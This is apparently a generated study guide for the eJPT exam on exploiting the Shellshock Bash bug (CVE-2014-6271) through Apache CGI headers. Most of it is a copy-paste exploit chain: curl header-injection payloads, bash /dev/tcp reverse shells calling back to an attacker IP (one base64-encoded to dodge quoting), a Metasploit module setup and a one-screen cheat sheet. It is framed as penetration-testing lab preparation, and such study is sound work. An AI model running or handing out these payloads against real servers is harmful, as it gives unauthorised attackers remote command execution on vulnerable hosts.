# Vulnerability Analysis: Shellshock (CVE-2014-6271)

Note: No transcript was provided. The following summary and commands are a conservative, typical eJPT-style workflow for identifying and exploiting Shellshock in a web/CGI context. Adjust paths and payloads to your target.

## What the video covers (Introduction / big picture)
- What Shellshock is: a Bash environment variable parsing bug that allows code execution when Bash processes function definitions from environment variables.
- Where it appears: commonly in Apache with mod_cgi/mod_cgid and CGI scripts (e.g., .cgi, .sh, .pl), where HTTP headers become environment variables.
- How to identify: enumerate web services, find CGI endpoints, then test injecting the classic Shellshock payload via headers.
- How to exploit: inject commands for proof-of-exploit (id, uname), then establish a reverse shell.
- Tooling: Nmap NSE for detection, directory fuzzers to find CGI, curl/Burp for manual testing, Metasploit for automated exploitation.

## Flow (ordered)
1. Enumerate HTTP/HTTPS services and version info.
2. Discover CGI endpoints (e.g., /cgi-bin/, .cgi/.sh files).
3. Test for Shellshock via header injection (User-Agent, Referer, Cookie).
4. Validate RCE with harmless commands (id, uname -a).
5. Get a reverse shell (bash TCP or nc) and stabilize.
6. Optional: Use Metasploit’s Apache mod_cgi Shellshock module if manual fails or for speed.

## Tools highlighted
- Nmap with NSE: http-shellshock
- Gobuster or ffuf for content/CGI discovery
- Nikto (has Shellshock checks)
- curl or Burp Suite for header injection testing
- Netcat (listener)
- Metasploit: exploit/multi/http/apache_mod_cgi_bash_env_exec
- Basic Unix utilities (base64, bash, python3 pty)

## Typical command walkthrough (detailed, copy-paste friendly)
Set your working vars:
```bash
export TARGET=10.10.10.10
export BASE=http://$TARGET
export CGI=/cgi-bin/test.cgi   # adjust after discovery
export LHOST=10.10.14.3        # your attack box IP
export LPORT=4444
```

1) Enumerate HTTP services and test Shellshock quickly with NSE
```bash
# Fast service/version discovery
nmap -sC -sV -p 80,443,8080,8000 $TARGET

# Shellshock NSE (adjust uri to a discovered CGI path)
nmap -sV -p80,443 --script http-shellshock \
  --script-args "http-shellshock.uri=$CGI" $TARGET
```

2) Find CGI endpoints
```bash
# Directory discovery for /cgi-bin/
gobuster dir -u $BASE/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# If /cgi-bin/ exists, find files inside; try common CGI extensions
gobuster dir -u $BASE/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x cgi,sh,pl

# Alternative with ffuf
ffuf -u $BASE/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u $BASE/cgi-bin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .cgi,.sh,.pl
```

3) Quick manual Shellshock test (User-Agent header)
```bash
# Harmless RCE test: expect uid/gid output in response
curl -s -H 'User-Agent: () { :;}; echo; echo; /bin/bash -c "id; uname -a"' $BASE$CGI
```

If you get no output or a 500/403, try a different header or CGI path:
```bash
curl -s -H 'Referer: () { :;}; /bin/bash -c "id"' $BASE$CGI
curl -s -H 'Cookie: () { :;}; /bin/bash -c "id"' $BASE$CGI
```

4) Reverse shell (bash over TCP)
Prepare listener:
```bash
nc -lvnp $LPORT
```

Trigger via User-Agent (works if CGI is vulnerable):
```bash
curl -s -H 'User-Agent: () { :;}; /bin/bash -c "bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1"' $BASE$CGI
```

If quoting is problematic, use base64 to avoid special characters:
```bash
export RSHELL="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
export B64=$(echo -n "$RSHELL" | base64 -w0)

curl -s -H 'User-Agent: () { :;}; /bin/bash -c "echo '"$B64"' | base64 -d | bash"' $BASE$CGI
```

5) Stabilize shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty cols 120 rows 30
```

6) Alternative/validation with Nikto
```bash
nikto -h $BASE -Plugins shellshock
```

7) Metasploit route (if preferred)
```bash
msfconsole -q
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS $TARGET
set RPORT 80
set TARGETURI $CGI
set PAYLOAD cmd/unix/reverse_bash
set LHOST $LHOST
set LPORT $LPORT
run
```

## Practical tips
- Shellshock usually hits Apache with mod_cgi/mod_cgid and CGI handlers; focus on /cgi-bin/ and files with .cgi/.sh/.pl. Some setups map other extensions to CGI, so fuzz extensions.
- Start with benign commands (id, uname, whoami) to confirm RCE before reverse shells.
- If HTTPS and self-signed, add -k to curl. Example: curl -ks ...
- Headers most likely to work: User-Agent, Referer, Cookie. Not all headers become environment variables in CGI—test a few.
- Quoting breaks many attempts. Use base64 encoding to avoid shell metacharacter issues.
- Nmap NSE needs the correct CGI path; combine with directory fuzzing before relying on NSE results.
- If responses don’t show command output, try commands that affect headers or response content, or check server error logs if you have access. Some CGI scripts suppress stdout.
- Some targets only accept POST to the script—try: curl -s -X POST -H 'User-Agent: ...' $BASE$CGI
- Not all Bash versions are vulnerable; some systems default to dash/ash. The CGI must invoke bash or pass the environment to bash for the bug to trigger.

## Minimal cheat sheet (one-screen flow)
```bash
# Vars
export TARGET=10.10.10.10; export BASE=http://$TARGET; export CGI=/cgi-bin/test.cgi
export LHOST=10.10.14.3; export LPORT=4444

# 1) Enumerate
nmap -sC -sV -p80,443 $TARGET
gobuster dir -u $BASE/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dir -u $BASE/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x cgi,sh,pl

# 2) Test Shellshock
curl -s -H 'User-Agent: () { :;}; echo; /bin/bash -c "id; uname -a"' $BASE$CGI

# 3) Reverse shell (listener + trigger)
nc -lvnp $LPORT
curl -s -H 'User-Agent: () { :;}; /bin/bash -c "bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1"' $BASE$CGI
# or base64-encoded payload:
B64=$(echo -n "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" | base64 -w0)
curl -s -H 'User-Agent: () { :;}; /bin/bash -c "echo '"$B64"' | base64 -d | bash"' $BASE$CGI

# 4) Stabilize shell
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
```

## Summary
- Shellshock is a Bash environment variable parsing flaw exploitable via CGI-exposed headers, enabling unauthenticated command execution on vulnerable web servers.
- The eJPT workflow: enumerate web services, find CGI endpoints, inject the classic Shellshock payload through HTTP headers, confirm RCE, and obtain a reverse shell.
- Key tools: Nmap NSE http-shellshock, gobuster/ffuf, curl/Burp for manual exploitation, Nikto for quick checks, and Metasploit for automated exploitation.
- Success hinges on finding the correct CGI path and handling quoting carefully; base64-wrapping the payload is a reliable approach.